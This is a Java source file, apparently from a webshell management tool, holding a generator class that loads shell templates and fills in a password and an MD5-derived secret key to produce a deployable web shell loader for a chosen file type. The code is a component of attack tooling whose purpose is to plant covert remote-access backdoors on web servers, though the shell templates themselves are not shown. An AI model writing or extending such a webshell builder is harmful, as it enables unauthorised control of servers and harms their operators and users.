package shells.cryptions.netcore;

import java.io.InputStream;
import util.Log;
import util.functions;

class Generate {
    Generate() {
    }

    public static byte[] GenerateShellLoder(String templateName, String suffix, String pass, String secretKey) {
        byte[] data = null;
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + templateName);
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            String key16 = functions.md5(secretKey).substring(0, 16);
            String code2 = code.replace("{pass}", pass).replace("{secretKey}", key16);

            InputStream inputStream2 = Generate.class.getResourceAsStream("template/shell." + suffix);
            if (inputStream2 != null) {
                String template = new String(functions.readInputStream(inputStream2));
                inputStream2.close();
                data = template.replace("{code}", code2).getBytes("UTF-8");
            } else {
                data = code2.getBytes("UTF-8");
            }
        } catch (Exception ex) {
            Log.error(ex);
        }
        return data;
    }
}
